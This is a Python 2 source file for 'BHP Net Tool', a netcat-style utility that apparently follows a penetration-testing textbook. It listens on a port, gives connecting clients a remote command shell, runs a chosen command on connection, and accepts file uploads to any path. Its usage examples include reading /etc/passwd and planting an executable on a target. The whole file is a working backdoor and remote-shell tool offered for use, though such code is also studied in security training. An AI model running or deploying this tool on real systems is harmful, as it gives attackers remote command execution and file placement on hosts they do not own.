import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
uploadDestination   = ""
PORT                = 0
BUFSIZE             = 4096

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhnet.py -t target_host -p port"
    print "-l --listen                  -listen on [host]:[port] fir incoming connections"
    print "-e --execute=file_to_run     -execute the given file upon -receiving a connections"
    print "-c --command                 -initialize a command shell"
    print "-u --upload=destination      -upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhnet.py -t 192.168.0.1 -p 5555 -u=c:\\target.exe"
    print "bhnet.py -t 192.168.0.1 -p 5555 -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | python bhnet.py -t 192.168.0.1 -p 135"
    sys.exit(0)

def ClientSender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, PORT))

        if len(buffer):
            client.send(buffer)

        while True:

            # wait for response
            recvLen = 1
            response = ""

            while recvLen:
                data = client.recv(BUFSIZE)
                recvLen = len(data)
                response += data

                if recvLen < BUFSIZE:
                    break

            print response

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            # Send off
            client.send(buffer)

    except:
        print "[*] Exception! Exiting."
        client.close()

def RunCommand(command):

    command = command.rstrip()

    # Run command and return the result
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Failed to execute command.\r\n"

    return output
def ClientHandle(client):
    global upload
    global execute
    global command

    # Check upload file.
    if len(uploadDestination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data  = client.recv(BUFSIZE)

            if not data:
                break
            else:
                file_buffer += data

        # write buffer to destination file.
        try:
            file_descriptor = open(uploadDestination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client.send("Successfully saved file to %s\r\n" % uploadDestination)

        except:
            client.send("Failed to save file to %s\r\n" % uploadDestination)

    # Check command is be executed
    if len(execute):
        # execute command
        output = RunCommand(execute)

        client.send(output)

    # now we go into another loop if a command shell was requested
    if command:

        while True:
            # show a simple prompt
            client.send("<BHP:#> ")

            # now we receive until we see linefeed (enter key)
            cmdBuffer = ""
            while "\n" not in cmdBuffer:
                cmdBuffer += client.recv(BUFSIZE)

            # we have a valid command so execute it and send back the results.
            response = RunCommand(cmdBuffer)

            client.send(response)

def ServerLoop():
    global  target

    # if target is null, we listen all interfaces
    if not len(target):
        target= "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, PORT))
    server.listen(5)

    while True:
        client, addr = server.accept()

        # assign thread to handle new client
        clientThread = threading.Thread(target=ClientHandle, args=(client,))
        clientThread.start()

def main():
    global listen
    global PORT
    global execute
    global command
    global uploadDestination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
            opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
            print str(err)
            usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            PORT = int(a)
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            uploadDestination = a
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin
    if not listen and len(target) and PORT > 0:
        # read in the buffer from command line
        # this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()

        # Send data off
        ClientSender(buffer)

    if listen:
        ServerLoop()

if __name__ == "__main__":
        main()

























































